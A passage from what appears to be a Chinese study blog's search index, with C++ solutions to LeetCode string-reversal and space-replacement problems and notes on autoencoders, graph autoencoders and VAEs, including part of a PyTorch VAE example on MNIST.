') &#123; //补上该单词，遇到空格说明单词结束。                    s[slow++] = s[i++];                &#125;            &#125;        &#125;        s.resize(slow); //slow的大小即为去除多余空格后的大小。    &#125;    string reverseWords(string s) &#123;        removeExtraSpaces(s); //去除多余空格，保证单词之间之只有一个空格，且字符串首尾没空格。        reverse(s, 0, s.size() - 1);        int start = 0; //removeExtraSpaces后保证第一个单词的开始下标一定是0。        for (int i = 0; i <= s.size(); ++i) &#123;            if (i == s.size() || s[i] == ' ') &#123; //到达空格或者串尾，说明一个单词结束。进行翻转。                reverse(s, start, i - 1); //翻转，注意是左闭右闭 []的翻转。                start = i + 1; //更新下一个单词的开始下标start            &#125;        &#125;        return s;    &#125;&#125;;</code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>空间复杂度：<strong>O(1)</strong></p><p>时间复杂度：O（N)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://programmercarl.com/0151.%E7%BF%BB%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%87%8C%E7%9A%84%E5%8D%95%E8%AF%8D.html#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%89%88%E6%9C%AC">代码随想录 (programmercarl.com)</a></p><p><a href="https://leetcode.cn/problems/reverse-words-in-a-string/solution/fan-zhuan-zi-fu-chuan-li-de-dan-ci-by-leetcode-sol/">https://leetcode.cn/problems/reverse-words-in-a-string/solution/fan-zhuan-zi-fu-chuan-li-de-dan-ci-by-leetcode-sol/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>替换空格</title>
      <link href="/2023/03/02/05.%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/"/>
      <url>/2023/03/02/05.%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="剑指-Offer-05-替换空格"><a href="#剑指-Offer-05-替换空格" class="headerlink" title="剑指 Offer 05. 替换空格"></a><a href="https://leetcode.cn/problems/ti-huan-kong-ge-lcof/">剑指 Offer 05. 替换空格</a></h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class=" language-python"><code class="language-python">请实现一个函数，把字符串 s 中的每个空格替换成<span class="token string">"%20"</span>。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"We are happy."</span>输出：<span class="token string">"We%20are%20happy."</span> 限制：<span class="token number">0</span> <span class="token operator">&lt;=</span> s 的长度 <span class="token operator">&lt;=</span> <span class="token number">10000</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>ti<span class="token operator">-</span>huan<span class="token operator">-</span>kong<span class="token operator">-</span>ge<span class="token operator">-</span>lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><ol><li><p>统计字符串数组中空格的个数</p></li><li><p>扩充数组到每个空格替换成 %20之后的大小。</p></li><li><p>然后从后向前替换空格，也就是双指针法，过程如下：</p><pre><code>     1. i 指向新长度的末尾。     2. j 指向旧长度的末尾。</code></pre></li></ol><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    string replaceSpace(string s) &#123;        int Initlen=s.size();//统计字符串的长度        int count=0;//统计空格的个数        for(auto &a:s)            if(a==' ')                count++;        // 扩充字符串s的大小，也就是每个空格替换成"%20"之后的大小        s.resize(Initlen+2*count);//重塑字符串长度        int Newsize=s.size();        /*         从后先前将空格替换为"%20"*/        for(int i=Initlen-1, j=Newsize-1;i>=0;i--,j--)&#123;            if(s[i]!=' ')&#123;                s[j]=s[i];            &#125;else&#123;                s[j]='0';                s[j-1]='2';                s[j-2]='%';                j-=2;            &#125;        &#125;        return s;    &#125;&#125;;</code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：<em>O</em>(<em>n</em>)。遍历字符串 <code>s</code> 一遍。</li><li>空间复杂度：O*(*1).由于原地拓展s所以复杂度是0（1）</li></ul><h2 id="总结：数组填充类"><a href="#总结：数组填充类" class="headerlink" title="总结：数组填充类"></a>总结：数组填充类</h2><p><strong><code>其实很多数组填充类的问题，</code></strong></p><p><strong><code>1. 都可以先预先给数组扩容带填充后的大小，</code></strong></p><p><strong><code>2. 然后在从后向前进行操作。 </code></strong></p><p><strong><code>两个好处： </code></strong></p><p><strong><code>1. 不用申请新数组。 </code></strong></p><p><strong><code>2.从后向前填充元素，避免了从前先后填充元素要来的 每次添加元素都要将添加元素之后的所有元素向后移动</code></strong></p><p>作者：Nehzil<br>链接：<a href="https://leetcode.cn/problems/ti-huan-kong-ge-lcof/solution/jian-zhi-offer-05-ti-huan-kong-ge-by-neh-p61r/">https://leetcode.cn/problems/ti-huan-kong-ge-lcof/solution/jian-zhi-offer-05-ti-huan-kong-ge-by-neh-p61r/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 字符串 </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>344. 反转字符串</title>
      <link href="/2023/03/01/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2023/03/01/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode.cn/problems/reverse-string/">344. 反转字符串</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><pre class=" language-python"><code class="language-python">编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 的额外空间解决这一问题。来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。<span class="token comment" spellcheck="true">###</span></code></pre><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"l"</span><span class="token punctuation">,</span><span class="token string">"l"</span><span class="token punctuation">,</span><span class="token string">"o"</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token string">"o"</span><span class="token punctuation">,</span><span class="token string">"l"</span><span class="token punctuation">,</span><span class="token string">"l"</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"h"</span><span class="token punctuation">]</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"H"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"h"</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"H"</span><span class="token punctuation">]</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20230301085904212.png" alt="image-20230301085904212"></p><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20230301085916775.png" alt="image-20230301085916775"></p><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><blockquote><p>c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    void reverseString(vector<char>& s) &#123;        int l,r;        l=0;        r=s.size()-1;        while(l<r)&#123;            char temp=s[l];            s[l]=s[r];            s[r]=temp;            l++;            r--;        &#125;    &#125;&#125;;</code></pre><h4 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h4><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20230301085944392.png" alt="image-20230301085944392"></p><h2 id="541-反转字符串-II"><a href="#541-反转字符串-II" class="headerlink" title="541. 反转字符串 II"></a><a href="https://leetcode.cn/problems/reverse-string-ii/">541. 反转字符串 II</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><pre class=" language-python"><code class="language-python">给定一个字符串 s 和一个整数 k，从字符串开头算起，每计数至 2k 个字符，就反转这 2k 字符中的前 k 个字符。如果剩余字符少于 k 个，则将剩余字符全部反转。如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。 来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>string<span class="token operator">-</span>ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出：<span class="token string">"bacdfeg"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"abcd"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出：<span class="token string">"bacd"</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>string<span class="token operator">-</span>ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>反转每个下标从 2<em>k</em> 的倍数开始的，长度为 k 的子串。若该子串长度不足 k*，则反转整个子串。</p><h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    string reverseStr(string s, int k) &#123;        for (int i = 0; i < s.size(); i += (2 * k)) &#123;            // 1. 每隔 2k 个字符的前 k 个字符进行反转            // 2. 剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符            if (i + k <= s.size()) &#123;                reverse(s.begin() + i, s.begin() + i + k );            &#125; else &#123;                // 3. 剩余字符少于 k 个，则将剩余字符全部反转。                reverse(s.begin() + i, s.end());            &#125;        &#125;        return s;    &#125;&#125;;</code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20230301101034491.png" alt="image-20230301101034491"></p><p><a href="https://leetcode.cn/problems/reverse-string-ii/solution/fan-zhuan-zi-fu-chuan-ii-by-leetcode-sol-ua7s/">541. 反转字符串 II 题解 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AE</title>
      <link href="/2023/02/28/AE/"/>
      <url>/2023/02/28/AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1-自编码-AE"><a href="#1-自编码-AE" class="headerlink" title="1.自编码 AE"></a>1.自编码 AE</h2><h3 id="1-由来"><a href="#1-由来" class="headerlink" title="1. 由来"></a>1. 由来</h3><p>首先让我们回忆一下<code>深度神经网络是干什么的?</code> 它从<code>数据中学习重要的特征, 这些特征允许我们在某些数据上进行某个的任务, 比如分类, 回归, 泛化等等</code>. 通过<code>自编码器 (Autoencoder), 我们可以 &quot;压缩&quot; 输入数据以进行高效地学习</code>,</p><p> 比如我们有一些文档, 我们想要 “压缩” 文档到一个低维度的向量; 又或者我们有很多张图, 我们提取图的特征到一个低维度向量.</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421055.png" alt="image-20230228220659200"></p><h3 id="2-编码器构成"><a href="#2-编码器构成" class="headerlink" title="2.编码器构成"></a>2.编码器构成</h3><p>自编码器中，有两个神经网络，分别为Encoder和Decoder，其任务分别是：</p><ul><li>Encoder：将读入的原始数据（图像、文字等）转换为一个向量</li><li>Decoder：将上述的向量还原成原始数据的形式</li></ul><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421166.png" alt="image-20230228220118720"></p><p>目标是<strong>希望还原出来的结果能够与原始数据尽可能的接近</strong>。其中的向量可称为Embeding</p><p>主要用处<strong>就是将原始数据（高维、复杂）经过Encoder后得到的向量（经过处理，低纬度）作为下游任务的输入</strong>： 降维 学习出特征。</p><p><a href="https://www.cnblogs.com/FavoriteStar/archive/2022/12/20/16993656.html#83%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B">【机器学习】李宏毅——AE自编码器(Auto-encoder) - FavoriteStar - 博客园 (cnblogs.com)</a></p><h3 id="3-训练过程"><a href="#3-训练过程" class="headerlink" title="3.训练过程"></a>3.训练过程</h3><h4 id="1-训练流程"><a href="#1-训练流程" class="headerlink" title="1. 训练流程"></a>1. 训练流程</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421478.png" alt="image-20230302123713298"></p><h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2. 例子"></a>2. 例子</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421048.png" alt="image-20230228220827282"></p><p><code>编码器的流程：</code></p><ol><li><strong>它的输入可能是一张小狗图片, 或者其他我们想要的数据形式;</strong> </li><li><strong>在数据被编码之后, 则是嵌入层 (embedding), 它是我们的数据在低维度 隐空间 (latent space) 的 表征 (representation);</strong> </li><li><strong>最后数据被传递给一个 解码器 (decoder) 来重新构建我们的小狗图片 (可以看出它带有一些雾化效果, 也就是噪声).</strong> </li><li><strong>我们可以根据输入和数据的 相似性(similarity) 来构建 代价 (loss), 以最小化重构误差:</strong></li></ol><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421109.png" alt="image-20230228220859587"></p><h3 id="4-如何使用编码器"><a href="#4-如何使用编码器" class="headerlink" title="4. 如何使用编码器"></a>4. 如何使用编码器</h3><h4 id="1-encoder-用处"><a href="#1-encoder-用处" class="headerlink" title="1.encoder 用处"></a>1.encoder 用处</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421120.png" alt="image-20230302124106041"></p><blockquote><p> 小狗使用</p></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421659.png" alt="image-20230228221124513"></p><p>假设我们有另一张小狗的输入, 且在嵌入层得到了输入的表征向量 [2,5], </p><p>那我们就可以用<code>低维的表征向量</code>去完成一些其他域/维度的任务, 比如<code>聚类</code> (clustering), 可视化 (visualization), 等等.</p><h4 id="2-decoder-用处"><a href="#2-decoder-用处" class="headerlink" title="2.decoder 用处"></a>2.decoder 用处</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421472.png" alt="image-20230302124240981"></p><p>输入向量通过解码器可以生成图片。====》图像生成。</p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/485054342">https://zhuanlan.zhihu.com/p/485054342</a></p><p><a href="https://www.bilibili.com/video/BV1mY411h7Hy/?spm_id_from=333.788.recommend_more_video.4&vd_source=5e8f069711510b3788382a0a03ff38e5">动画讲CV/autoencoder自编码器原理讲解/双语字幕_哔哩哔哩_bilibili</a></p><h2 id="2-图自编码器GAE"><a href="#2-图自编码器GAE" class="headerlink" title="2.图自编码器GAE"></a>2.图自编码器GAE</h2><h3 id="1-GAE-结构图"><a href="#1-GAE-结构图" class="headerlink" title="1.GAE 结构图"></a>1.GAE 结构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421051.png" alt="image-20230301104221195"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421457.png" alt="image-20230301104418884"></p><h3 id="2-encoder"><a href="#2-encoder" class="headerlink" title="2.encoder"></a>2.encoder</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421065.png" alt="image-20230301104527660"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421644.png" alt="image-20230301104545842"></p><h3 id="3-decoder"><a href="#3-decoder" class="headerlink" title="3. decoder"></a>3. decoder</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421262.png" alt="image-20230301104634709"></p><p><code>z是N*F维，z.z^t N*f*f*N===N*N 保证了和输入的数据同纬度</code></p><h3 id="4-如何训练"><a href="#4-如何训练" class="headerlink" title="4. 如何训练"></a>4. 如何训练</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201421148.png" alt="image-20230301104829815"></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&mid=2247504136&idx=1&sn=ab83adb768a8378e0ee1ea2dc12a0fee&chksm=96ea0e88a19d879ecbeb647fc31fa25fa7f363921b9ddf7848d86d4083c20cb6e7a05aef8613&mpshare=1&scene=23&srcid=&sharer_sharetime=1583733589784&sharer_shareid=49ce875fba478557cba19c6b33e0002b#rd">图自编码器的起源和应用 (qq.com)</a></p><h3 id="GAE-代码"><a href="#GAE-代码" class="headerlink" title="GAE 代码"></a>GAE 代码</h3><p><a href="https://zhuanlan.zhihu.com/p/485054342">PyG应用: 教程(六) 图自编码器与变分图自编码器 - 知乎 (zhihu.com)</a></p><p><a href="https://github.com/DaehanKim/vgae_pytorch">GitHub - DaehanKim/vgae_pytorch: This repository implements variational graph auto encoder by Thomas Kipf.</a></p><h2 id="3-变分编码器-VAE"><a href="#3-变分编码器-VAE" class="headerlink" title="3.变分编码器 VAE"></a>3.变分编码器 VAE</h2><h3 id="0-VAE原理"><a href="#0-VAE原理" class="headerlink" title="0. VAE原理"></a>0. VAE原理</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422635.png" alt="image-20230306154853469"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422344.png" alt="image-20230306155117385"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422637.png" alt="image-20230306155320675"></p><h3 id="1-生成和推理过程"><a href="#1-生成和推理过程" class="headerlink" title="1.生成和推理过程"></a>1.生成和推理过程</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422472.png" alt="image-20230302205451216"></p><h3 id="2-变分近似后验"><a href="#2-变分近似后验" class="headerlink" title="2. 变分近似后验"></a>2. 变分近似后验</h3><p><code>变分贝叶斯是把原本的统计推断问题转换成优化问题（两个分布的距离），并利用一种分析方法来近似隐变量的后验分布，从而达到原本统计推断的问题。</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422976.png" alt="image-20230302205312638"></p><h3 id="3-VAE-的架构图"><a href="#3-VAE-的架构图" class="headerlink" title="3.VAE 的架构图"></a>3.VAE 的架构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422338.png" alt="image-20230302210256209"></p><p>参考链接：<a href="https://www.bilibili.com/video/BV1mT4y1F7u8/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">基于变分自编码器(VAE)的Mnist手写体自动生成-DeepSnow_哔哩哔哩_bilibili</a></p><h3 id="4-损失函数的解释"><a href="#4-损失函数的解释" class="headerlink" title="4. 损失函数的解释"></a>4. 损失函数的解释</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422536.png" alt="image-20230302210659087"></p><p><code>注意事项：</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422973.png" alt="image-20230302210936706"></p><h3 id="5-VAE和AE的结构比较"><a href="#5-VAE和AE的结构比较" class="headerlink" title="5. VAE和AE的结构比较"></a>5. VAE和AE的结构比较</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422875.png" alt="image-20230302124711790"></p><h3 id="6-自变分编码的公式推导"><a href="#6-自变分编码的公式推导" class="headerlink" title="6.自变分编码的公式推导"></a>6.自变分编码的公式推导</h3><p><a href="https://www.cnblogs.com/FavoriteStar/p/16995591.html#variational-auto-encodervae">【机器学习】李宏毅——Unsupervised Learning - FavoriteStar - 博客园 (cnblogs.com)</a></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote><ol><li>前半部分损失函数解释</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422646.png" alt="image-20230302211044631"></p><p><strong><code>重点理解： 损失函数第一个值：编写代码时候用 均方差或者交叉熵代替</code></strong></p><blockquote><p>3.针对上面公式的DKL散度负号的解释？<code>KL散度始终大于0</code></p></blockquote><p>注意事项：公式中的<code>带有负号</code>与原来的<code>KL散度前的负号相抵消</code>:即**<code>-Dkl&gt;0</code>** </p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422658.png" alt="image-20230302211327683"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422867.png" alt="image-20230302213201288"></p><p>参考链接<a href="https://www.bilibili.com/video/BV1KN4y1j7th/?p=2&spm_id_from=pageDriver&vd_source=5e8f069711510b3788382a0a03ff38e5">02 变分自动编码器的损失函数_哔哩哔哩_bilibili</a></p><h3 id="7-代码"><a href="#7-代码" class="headerlink" title="7.代码"></a>7.代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">import</span> torchvision<span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">from</span> torchvision<span class="token punctuation">.</span>utils <span class="token keyword">import</span> save_image<span class="token comment" spellcheck="true"># 这句用来设置pytorch在哪块GPU上运行</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span> <span class="token string">'cpu'</span><span class="token punctuation">)</span>sample_dir <span class="token operator">=</span> <span class="token string">'samples'</span><span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>sample_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>sample_dir<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 超参数设置</span><span class="token comment" spellcheck="true"># Hyper-parameters</span>image_size <span class="token operator">=</span> <span class="token number">784</span>h_dim <span class="token operator">=</span> <span class="token number">400</span>z_dim <span class="token operator">=</span> <span class="token number">20</span>num_epochs <span class="token operator">=</span> <span class="token number">15</span>batch_size <span class="token operator">=</span> <span class="token number">128</span>learning_rate <span class="token operator">=</span> <span class="token number">1e</span><span class="token operator">-</span><span class="token number">3</span>dataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span>root<span class="token operator">=</span><span class="token string">'../../../data/minist'</span><span class="token punctuation">,</span>                                     train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                                     transform<span class="token operator">=</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                     download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 数据加载器</span>data_loader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>dataset<span class="token punctuation">,</span>                                          batch_size<span class="token operator">=</span>batch_size<span class="token punctuation">,</span>                                          shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt <span class="token comment" spellcheck="true"># plt 用于显示图片</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>image <span class="token keyword">as</span> mpimg <span class="token comment" spellcheck="true"># mpimg 用于读取图片</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">class</span> <span class="token class-name">VAE</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> image_size<span class="token operator">=</span><span class="token number">784</span><span class="token punctuation">,</span> h_dim<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> z_dim<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>VAE<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>image_size<span class="token punctuation">,</span> h_dim<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输入层</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>h_dim<span class="token punctuation">,</span> z_dim<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 均值 向量</span>        self<span class="token punctuation">.</span>fc3 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>h_dim<span class="token punctuation">,</span> z_dim<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 保准方差 向量</span>        self<span class="token punctuation">.</span>fc4 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>z_dim<span class="token punctuation">,</span> h_dim<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc5 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>h_dim<span class="token punctuation">,</span> image_size<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 编码过程</span>    <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>x<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        h <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>h<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>fc3<span class="token punctuation">(</span>h<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 随机生成隐含向量</span>    <span class="token keyword">def</span> <span class="token function">reparameterize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mu<span class="token punctuation">,</span> log_var<span class="token punctuation">)</span><span class="token punctuation">:</span>        std <span class="token operator">=</span> torch<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>log_var <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>        eps <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn_like<span class="token punctuation">(</span>std<span class="token punctuation">)</span>        <span class="token keyword">return</span> mu <span class="token operator">+</span> eps <span class="token operator">*</span> std<span class="token comment" spellcheck="true"># u+标准差*标准正态分布的一个采样</span>    <span class="token comment" spellcheck="true"># 解码过程</span>    <span class="token keyword">def</span> <span class="token function">decode</span><span class="token 